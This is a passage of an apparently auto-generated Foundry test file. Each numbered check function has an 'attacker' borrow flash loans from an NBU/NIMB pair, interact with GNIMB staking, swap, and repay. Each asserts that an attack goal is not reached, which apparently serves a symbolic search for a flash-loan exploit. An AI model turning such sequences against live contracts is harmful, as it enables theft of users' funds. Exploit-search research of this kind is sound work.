        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3974(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3975(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3976(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3977(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3978(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3979(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3980(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3981(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3982(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3983(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3984(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3985(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3986(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3987(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3988(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3989(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3990(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3991(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3992(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3993(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3994(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3995(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3996(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3997(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3998(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3999(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
